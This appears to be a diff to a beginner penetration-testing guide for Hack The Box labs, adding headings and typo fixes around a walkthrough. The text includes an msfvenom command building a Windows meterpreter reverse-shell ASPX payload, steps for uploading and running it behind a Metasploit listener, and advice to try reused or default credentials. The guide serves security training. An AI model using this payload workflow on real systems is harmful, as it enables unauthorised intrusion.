@@ -37,6 +37,8 @@ Previously we used Metasploit to automagically exploit a vulnerability and get a
 
 The listener catches the reverse shell connection - we now have a connection / reverse shell on the target, but we can't always rely on Metasploit to do this for us.
 
+### 1 - Preparing the payload
+
 First we prepare a payload with the correct file extension. The payload has to match your listener in Metasploit, and the technology on the target. Imagine a web-server running IIS, and we've found out we can upload files and where the files are put. Let's generate an ASPX-payload using msfvenom:
 
 `msfvenom -p windows/meterpreter/reverse_tcp lhost=your_ip_addr lport=4444 -f aspx -o yourname.aspx`
@@ -49,7 +51,9 @@ First we prepare a payload with the correct file extension. The payload has to m
 
 We then use the `cat`command to print the contents of the file we generated. As you can see it's a bunch of mumbo jumbo code, but this is actually the _payload_, the code that will execute on the system to give you access.
 
-![](.gitbook/assets/image%20%2816%29.png)
+![](.gitbook/assets/image%20%2817%29.png)
+
+### 2 - Setting up a listener
 
 Now that we have prepared our payload, we open msfconsole, which we will use to deliver our payload to the target box.
 
@@ -97,9 +101,9 @@ To interact with a session use the following command, where n is the numbered se
 
 ctrl+z is the shortcut to background sessions.
 
-#### Well, now what?
+### 3 - Running an exploit
 
-Ok, so we have prepared our exploit and listener. Now we need to actually find a way to upload and execute this payload on our target. In Part 1 of this guide we used an already prepared exploit module in Metasploit to exploit the target, but this time we actually have to manually do the uploading and execution. We won't give away any HTB solutions, but if you try the machine Deve, you can probably figure out how this is going to work. Try to first find a way to upload the payload to the machine. Many services allow file uploads! You then need some way to execute it. When you are able to find a way, remember to have your listener ready.
+Ok, so we have prepared our payload and listener. Now we need to actually find a way to upload and execute this payload on our target. In Part 1 of this guide we used an already prepared exploit module in Metasploit to exploit the target, but this time we actually have to manually do the uploading and execution. We won't give away any HTB solutions, but if you try the machine Devel, you can try to figure out how this is going to work. Try to first find a way to upload the payload to the machine. Many services allow file uploads. You then need some way to execute it. When you are able to find a way, remember to have your listener ready so your payload, the reverse shell can call back to your listener.
 
 ## **Linux terminal tricks**
 
@@ -146,6 +150,13 @@ Installing things in Kali
 `$ nmap --script nameOfScript ls -la /usr/share/nmap/scripts/*`
 
 ## **Credential abuse**
+
+\*\*\*\*
+
+Some thoughts:
+
+* Think like a user, then like a hacker
+* Bugs and misconfigurations
 
 Reuse of credentials \(usernames, passwords and keys\) and default credentials are the most common vulnerabilities, and you will see it everywhere. It's such an easy win if it works that you must never forget to at least try even though it may seem unlikely.
 
